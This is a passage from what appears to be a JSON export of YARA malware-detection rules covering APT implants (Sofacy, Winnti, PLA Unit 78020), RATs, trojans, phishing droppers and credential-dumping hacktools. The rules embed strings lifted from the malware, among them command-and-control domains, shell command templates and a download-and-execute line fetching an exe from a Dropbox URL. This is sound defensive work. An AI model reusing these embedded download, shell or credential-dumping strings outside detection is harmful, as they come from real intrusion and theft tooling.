\n   strings:\n      $s1 = \"\\\\tf394kv.dll\" fullword wide\n      $s2 = \"DWN_DLL_MAIN.dll\" fullword ascii\n      $s3 = \"?SendDataToServer_2@@YGHPAEKEPAPAEPAK@Z\" ascii\n      $s4 = \"?Applicate@@YGHXZ\" ascii\n      $s5 = \"?k@@YGPAUHINSTANCE__@@PBD@Z\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them\n}","date":"2015-12-04 14:04:21","description":"AZZY Backdoor Implant 4.3 - Sample 1","minimum_yara":"1.7","name":"Sofacy_AZZY_Backdoor_Implant_1_RID326B","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"8e08f404cbc943c9b61bf55e4efaa936","score":75,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_AZZY_Backdoor_HelperDLL_RID3242 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Dropped C&C helper DLL for AZZY 4.3\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:57:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"snd.dll\" fullword ascii\n      $s1 = \"InternetExchange\" fullword ascii\n      $s2 = \"SendData\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-12-04 13:57:31","description":"Dropped C&C helper DLL for AZZY 4.3","minimum_yara":"1.7","name":"Sofacy_AZZY_Backdoor_HelperDLL_RID3242","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"9633e2bb889f3bb7ed2bb332b5981d55","score":75,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_CollectorStealer_Gen1_RID31F6 : APT DEMO EXE FILE GEN MAL RUSSIA {\n   meta:\n      description = \"Generic rule to detect Sofacy Malware Collector Stealer\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NvCpld.dll\" fullword ascii\n      $s1 = \"NvStop\" fullword ascii\n      $s2 = \"NvStart\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-12-04 13:44:51","description":"Generic rule to detect Sofacy Malware Collector Stealer","minimum_yara":"1.7","name":"Sofacy_CollectorStealer_Gen1_RID31F6","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"320a8c4dd6ad40cf6a222872fb93b110","score":75,"tags":["MAL","DEMO","FILE","APT","RUSSIA","GEN","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_CollectorStealer_Gen2_RID31F7 : APT DEMO EXE FILE GEN RUSSIA {\n   meta:\n      description = \"File collectors / USB stealers - Generic\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:45:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"msdetltemp.dll\" fullword ascii\n      $s2 = \"msdeltemp.dll\" fullword wide\n      $s3 = \"Delete Temp Folder Service\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}","date":"2015-12-04 13:45:01","description":"File collectors / USB stealers - Generic","minimum_yara":"1.7","name":"Sofacy_CollectorStealer_Gen2_RID31F7","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"79c69dd60ce892112bf1a6b2e6b5659d","score":85,"tags":["DEMO","FILE","APT","RUSSIA","GEN","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_CollectorStealer_Gen3_RID31F8 : APT DEMO EXE FILE GEN RUSSIA {\n   meta:\n      description = \"File collectors / USB stealers - Generic\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:45:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NvCpld.dll\" fullword ascii\n      $s4 = \"NvStart\" fullword ascii\n      $s5 = \"NvStop\" fullword ascii\n      $a1 = \"%.4d%.2d%.2d%.2d%.2d%.2d%.2d%.4d\" fullword wide\n      $a2 = \"IGFSRVC.dll\" fullword wide\n      $a3 = \"Common User Interface\" fullword wide\n      $a4 = \"igfsrvc Module\" fullword wide\n      $b1 = \" Operating System                        \" fullword wide\n      $b2 = \"Microsoft Corporation                                       \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( all of ( $s* ) and ( all of ( $a* ) or all of ( $b* ) ) )\n}","date":"2015-12-04 13:45:11","description":"File collectors / USB stealers - Generic","minimum_yara":"1.7","name":"Sofacy_CollectorStealer_Gen3_RID31F8","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"0747aafbcacb322a7843ea369bd1a0ad","score":85,"tags":["DEMO","FILE","APT","RUSSIA","GEN","EXE"]},{"author":"Florian Roth","content":"rule PHISH_02Dez2015_dropped_p0o6543f_RID312C : DEMO EXE FILE MAL T1193 T1203 {\n   meta:\n      description = \"Phishing Wave - file p0o6543f.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/\"\n      date = \"2015-12-02 13:11:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"netsh.exe\" fullword wide\n      $s2 = \"routemon.exe\" fullword wide\n      $s3 = \"script=\" fullword wide\n      $s4 = \"disconnect\" fullword wide\n      $s5 = \"GetClusterResourceTypeKey\" fullword ascii\n      $s6 = \"QueryInformationJobObject\" fullword ascii\n      $s7 = \"interface\" fullword wide\n      $s8 = \"connect\" fullword wide\n      $s9 = \"FreeConsole\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}","date":"2015-12-02 13:11:11","description":"Phishing Wave - file p0o6543f.exe","minimum_yara":"1.7","name":"PHISH_02Dez2015_dropped_p0o6543f_RID312C","reference":"http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/","required_modules":[],"rule_hash":"0b2a712598e2c8d0c6c21a90374cd526","score":70,"tags":["T1203","T1193","MAL","DEMO","FILE","EXE"]},{"author":"Florian Roth","content":"rule PHISH_02Dez2015_attach_P_ORD_C_10156_124658_RID3397 : DEMO FILE MAL T1193 T1203 {\n   meta:\n      description = \"Phishing Wave - file P-ORD-C-10156-124658.xls\"\n      author = \"Florian Roth\"\n      reference = \"http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/\"\n      date = \"2015-12-02 14:54:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Execute\" ascii\n      $s2 = \"Process WriteParameterFiles\" fullword ascii\n      $s3 = \"WScript.Shell\" fullword ascii\n      $s4 = \"STOCKMASTER\" fullword ascii\n      $s5 = \"InsertEmailFax\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 200KB and all of them\n}","date":"2015-12-02 14:54:21","description":"Phishing Wave - file P-ORD-C-10156-124658.xls","minimum_yara":"1.7","name":"PHISH_02Dez2015_attach_P_ORD_C_10156_124658_RID3397","reference":"http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/","required_modules":[],"rule_hash":"30f1eeeb7c829fd96e997e3ae2eefb22","score":70,"tags":["T1203","DEMO","T1193","FILE","MAL"]},{"author":"Florian Roth","content":"rule GlassRAT_Generic_RID2D0E : DEMO EXE FILE GEN MAL T1050 T1085 {\n   meta:\n      description = \"Detects GlassRAT Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/peering-into-glassrat/\"\n      date = \"2015-11-23 10:15:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL, T1050, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c %s\" fullword ascii\n      $s2 = \"update.dll\" fullword ascii\n      $s3 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\RasAuto\\\\Parameters\" fullword ascii\n      $s4 = \"%%temp%%\\\\%u\" fullword ascii\n      $s5 = \"\\\\off.dat\" fullword ascii\n      $s6 = \"rundll32 \\\"%s\\\",AddNum\" fullword ascii\n      $s7 = \"cmd.exe /c erase /F \\\"%s\\\"\" fullword ascii\n      $s8 = \"SYSTEM\\\\ControlSet00%d\\\\Services\\\\RasAuto\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 15MB and 5 of them\n}","date":"2015-11-23 10:15:31","description":"Detects GlassRAT Malware","minimum_yara":"1.7","name":"GlassRAT_Generic_RID2D0E","reference":"https://blogs.rsa.com/peering-into-glassrat/","required_modules":[],"rule_hash":"a67da6cd4c8b9d82705f15f246820511","score":80,"tags":["T1050","MAL","DEMO","FILE","T1085","GEN","EXE"]},{"author":"Florian Roth","content":"rule Fareit_Trojan_Oct15_RID2E24 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Fareit Trojan from Sep/Oct 2015 Wave\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/5VYtlU\"\n      date = \"2015-10-18 11:01:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ebai.exe\" fullword wide\n      $s2 = \"Origina\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1 in ( 0 .. 30000 ) and $s2 in ( 0 .. 30000 )\n}","date":"2015-10-18 11:01:51","description":"Detects Fareit Trojan from Sep/Oct 2015 Wave","minimum_yara":"1.7","name":"Fareit_Trojan_Oct15_RID2E24","reference":"http://goo.gl/5VYtlU","required_modules":[],"rule_hash":"861bf95fc9b7db9ce2b2783f4e106bac","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Upatre_Hazgurut_RID2D3B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Upatre malware dropped by Downloader - file hazgurut.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7\"\n      date = \"2015-10-13 10:23:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"barcod\" fullword ascii\n      $s0 = \"msports.dll\" fullword ascii\n      $s1 = \"nddeapi.dll\" fullword ascii\n      $s2 = \"glmf32.dll\" fullword ascii\n      $s3 = \"<requestedExecutionLevel level=\\\"requireAdministrator\\\" uiAccess=\\\"false\\\">\" fullword ascii\n      $s4 = \"cmutil.dll\" fullword ascii\n      $s5 = \"mprapi.dll\" fullword ascii\n      $s6 = \"glmf32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and $a1 in ( 0 .. 4000 ) and all of ( $s* )\n}","date":"2015-10-13 10:23:01","description":"Detects Upatre malware dropped by Downloader - file hazgurut.exe","minimum_yara":"1.7","name":"Upatre_Hazgurut_RID2D3B","reference":"https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7","required_modules":[],"rule_hash":"11ebae2755c049c35e5a1e491cc6f2bd","score":70,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Winnti_signing_cert_RID2EE5 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a signing certificate used by the Winnti APT group\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/\"\n      date = \"2015-10-10 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Guangzhou YuanLuo Technology Co.\" ascii\n      $s2 = \"Guangzhou YuanLuo Technology Co.,Ltd\" ascii\n      $s3 = \"$Asahi Kasei Microdevices Corporation0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them\n}","date":"2015-10-10 11:34:01","description":"Detects a signing certificate used by the Winnti APT group","minimum_yara":"1.7","name":"Winnti_signing_cert_RID2EE5","reference":"https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/","required_modules":[],"rule_hash":"7f516b615d90fb27c00bd394bf85389d","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Winnti_malware_Nsiproxy_RID309D : CHINA DEMO EXE FILE MAL T1014 T1050 T1090 {\n   meta:\n      description = \"Detects a Winnti rootkit\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-10-10 12:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1014, T1050, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Driver\\\\nsiproxy\" fullword wide\n      $a1 = \"\\\\Device\\\\StreamPortal\" fullword wide\n      $a2 = \"\\\\Device\\\\PNTFILTER\" fullword wide\n      $s1 = \"Cookie: SN=\" fullword ascii\n      $s2 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" fullword wide\n      $s3 = \"Winqual.sys\" fullword wide\n      $s4 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\" fullword wide\n      $s5 = \"http://www.wasabii.com.tw 0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $x1 and 1 of ( $a* ) and 2 of ( $s* )\n}","date":"2015-10-10 12:47:21","description":"Detects a Winnti rootkit","minimum_yara":"1.7","name":"Winnti_malware_Nsiproxy_RID309D","reference":"-","required_modules":[],"rule_hash":"dd12b43a7020dac3b83fb691a60510b9","score":75,"tags":["T1014","T1050","T1090","MAL","DEMO","FILE","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Winnti_malware_UpdateDLL_RID3070 : CHINA DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"Detects a Winnti malware - Update.dll\"\n      author = \"Florian Roth\"\n      reference = \"VTI research\"\n      date = \"2015-10-10 12:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = \"'Wymajtec$Tima Stempijg Sarviges GA -$G2\" fullword ascii\n      $c2 = \"AHDNEAFE1.sys\" fullword ascii\n      $c3 = \"SOTEFEHJ3.sys\" fullword ascii\n      $c4 = \"MainSYS64.sys\" fullword ascii\n      $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword wide\n      $s2 = \"Update.dll\" fullword ascii\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n      $s4 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n      $s5 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" fullword wide\n      $s6 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n      $s7 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n      $s8 = \"HOST: %s\" fullword ascii\n      $s9 = \"$$$--Hello\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( 1 of ( $c* ) and 3 of ( $s* ) ) or all of ( $s* ) )\n}","date":"2015-10-10 12:39:51","description":"Detects a Winnti malware - Update.dll","minimum_yara":"1.7","name":"Winnti_malware_UpdateDLL_RID3070","reference":"VTI research","required_modules":[],"rule_hash":"d394a36c721f84e9049a0a401faf7a14","score":75,"tags":["T1050","MAL","DEMO","FILE","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Winnti_malware_FWPK_RID2E69 : CHINA DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"Detects a Winnti malware - FWPKCLNT.SYS\"\n      author = \"Florian Roth\"\n      reference = \"VTI research\"\n      date = \"2015-10-10 11:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\\\" fullword wide\n      $s1 = \"%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u\" fullword ascii\n      $s2 = \"FWPKCLNT.SYS\" fullword ascii\n      $s3 = \"Port Layer\" fullword wide\n      $s4 = \"%x->%x, icmp type %d, code %d\" fullword ascii\n      $s5 = \"\\\\BaseNamedObjects\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}\" fullword wide\n      $s6 = \"\\\\Ndi\\\\Interfaces\" fullword wide\n      $s7 = \"\\\\Device\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}\" fullword wide\n      $s8 = \"Bad packet\" fullword ascii\n      $s9 = \"\\\\BaseNamedObjects\\\\EKV0000000000\" fullword wide\n      $s10 = \"%x->%x\" fullword ascii\n      $s11 = \"IPInjectPkt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 642KB and all of them\n}","date":"2015-10-10 11:13:21","description":"Detects a Winnti malware - FWPKCLNT.SYS","minimum_yara":"1.7","name":"Winnti_malware_FWPK_RID2E69","reference":"VTI research","required_modules":[],"rule_hash":"cfb4375bfea67ded293f982e694a68d8","score":75,"tags":["T1050","MAL","DEMO","FILE","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Winnti_malware_StreamPortal_Gen_RID3388 : CHINA DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects a Winnti malware - Streamportal\"\n      author = \"Florian Roth\"\n      reference = \"VTI research\"\n      date = \"2015-10-10 14:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Proxies destination address/port for TCP\" fullword wide\n      $s3 = \"\\\\Device\\\\StreamPortal\" fullword wide\n      $s4 = \"Transport-Data Proxy Sub-Layer\" fullword wide\n      $s5 = \"Cookie: SN=\" fullword ascii\n      $s6 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" fullword wide\n      $s17 = \"NTOSKRNL.EXE\" fullword wide\n      $s19 = \"FwpsReferenceNetBufferList0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 275KB and all of them\n}","date":"2015-10-10 14:51:51","description":"Detects a Winnti malware - Streamportal","minimum_yara":"1.7","name":"Winnti_malware_StreamPortal_Gen_RID3388","reference":"VTI research","required_modules":[],"rule_hash":"1babba12643d522ec9869c192e786a26","score":75,"tags":["MAL","DEMO","FILE","CHINA","GEN","EXE"]},{"author":"Florian Roth","content":"rule Indetectables_RAT_RID2D8E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux\"\n      author = \"Florian Roth\"\n      reference = \"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/\"\n      date = \"2015-10-01 10:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Coded By M3\" fullword wide\n      $s2 = \"Stub Undetector M3\" fullword wide\n      $s3 = \"www.webmenegatti.com.br\" wide\n      $s4 = \"M3n3gatt1\" fullword wide\n      $s5 = \"TheMisterFUD\" fullword wide\n      $s6 = \"KillZoneKillZoneKill\" fullword ascii\n      $s7 = \"[[__M3_F_U_D_M3__]]$\" fullword ascii\n      $s8 = \"M3_F_U_D_M3\" ascii\n      $s9 = \"M3n3gatt1hack3r\" fullword wide\n      $s10 = \"M3n3gatt1hack3r\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 1 of them\n}","date":"2015-10-01 10:36:51","description":"Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux","minimum_yara":"1.7","name":"Indetectables_RAT_RID2D8E","reference":"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/","required_modules":[],"rule_hash":"38e427f07be5fb2a53844f0b6de008e9","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule BergSilva_Malware_RID2DB8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a malware from the same author as the Indetectables RAT\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-10-01 10:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Berg Silva\\\\Desktop\\\\\" wide\n      $x2 = \"URLDownloadToFileA 0, \\\"https://dl.dropbox.com/u/105015858/nome.exe\\\", \\\"c:\\\\nome.exe\\\", 0, 0\" fullword wide\n      $s1 = \" Process.Start (Path.GetTempPath() & \\\"name\\\" & \\\".exe\\\") 'start server baixado\" fullword wide\n      $s2 = \"FileDelete(@TempDir & \\\"\\\\nome.exe\\\") ;Deleta o Arquivo para que possa ser executado normalmente\" fullword wide\n      $s3 = \" Lib \\\"\\\\WINDOWS\\\\system32\\\\UsEr32.dLl\\\"\" fullword wide\n      $s4 = \"$Directory = @TempDir & \\\"\\\\nome.exe\\\" ;Define a variavel\" fullword wide\n      $s5 = \"https://dl.dropbox.com/u/105015858\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 2 of ( $s* ) )\n}","date":"2015-10-01 10:43:51","description":"Detects a malware from the same author as the Indetectables RAT","minimum_yara":"1.7","name":"BergSilva_Malware_RID2DB8","reference":"-","required_modules":[],"rule_hash":"8a14ff87bf0cee341fbd91e26ec1018d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule VSSown_VBS_RID2AAB : DEMO HKTL SCRIPT T1047 {\n   meta:\n      description = \"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-10-01 07:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SCRIPT, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Select * from Win32_Service Where Name ='VSS'\" ascii\n      $s1 = \"Select * From Win32_ShadowCopy\" ascii\n      $s2 = \"cmd /C mklink /D \" ascii\n      $s3 = \"ClientAccessible\" ascii\n      $s4 = \"WScript.Shell\" ascii\n      $s5 = \"Win32_Process\" ascii\n   condition: \n      all of them\n}","date":"2015-10-01 07:36:41","description":"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere","minimum_yara":"1.7","name":"VSSown_VBS_RID2AAB","reference":"-","required_modules":[],"rule_hash":"ca9257eef68fa327b3865265928cf463","score":75,"tags":["DEMO","SCRIPT","T1047","HKTL"]},{"author":"Florian Roth","content":"rule QuarksPwDump_Gen_RID2D5E : DEMO GEN HKTL T1003 {\n   meta:\n      description = \"Detects all QuarksPWDump versions\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-09-29 10:28:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n      $s2 = \"%d dumped\" fullword ascii\n      $s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n      $s4 = \"\\\\SAM-%u.dmp\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-09-29 10:28:51","description":"Detects all QuarksPWDump versions","minimum_yara":"1.7","name":"QuarksPwDump_Gen_RID2D5E","reference":"-","required_modules":[],"rule_hash":"361b37066f8dc0952f15d9d3f7e7becf","score":80,"tags":["DEMO","T1003","GEN","HKTL"]},{"author":"Florian Roth","content":"rule Unit78020_Malware_Gen1_RID2E84 : APT CHINA DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 11:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"greensky27.vicp.net\" fullword wide\n      $x2 = \"POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1\" fullword ascii\n      $x3 = \"GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1\" fullword ascii\n      $x4 = \"serch.vicp.net\" fullword wide\n      $x5 = \"greensky27.vicp.net\" fullword wide\n      $x6 = \"greensky27.vicp.net.as\" fullword wide\n      $x7 = \"greensky27.vcip.net\" fullword wide\n      $x8 = \"pnoc-ec.vicp.net\" fullword wide\n      $x9 = \"aseanph.vicp.net\" fullword wide\n      $x10 = \"pnoc.vicp.net\" fullword wide\n      $a1 = \"dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n      $a2 = \"User-Agent: Netscape\" fullword ascii\n      $a3 = \"Accept-Language:En-us/r/n\" fullword wide\n      $a4 = \"\\\\Office Start.lnk\" fullword wide\n      $a5 = \"\\\\MSN Talk Start.lnk\" fullword wide\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n      $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n      $s3 = \"%USERPROFILE%\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword wide\n      $s4 = \"Content-Type:application/x-www-form-urlencoded/r/n\" fullword wide\n      $s5 = \"Hello World!\" fullword wide\n      $s6 = \"Accept-Encoding:gzip,deflate/r/n\" fullword wide\n      $s7 = \"/%d%s%d\" fullword ascii\n      $s8 = \"%02d-%02d-%02d %02d:%02d\" fullword wide\n      $s9 = \"WininetMM Version 1.0\" fullword 